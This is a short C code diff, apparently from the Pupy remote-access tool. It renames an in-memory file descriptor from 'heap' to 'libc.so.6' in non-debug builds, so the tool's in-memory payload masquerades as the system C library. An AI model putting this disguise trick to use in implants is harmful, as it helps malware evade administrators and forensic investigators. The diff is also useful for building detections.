@@ -35,7 +35,7 @@ inline static int pupy_memfd_create(char *path, unsigned int path_size)
 
 #ifndef DEBUG
 	memset(path, 0x0, path_size);
-	strncpy(path, "heap", path_size);
+	strncpy(path, "libc.so.6", path_size);
 #endif
 
     /* Do not make syscall billion times */
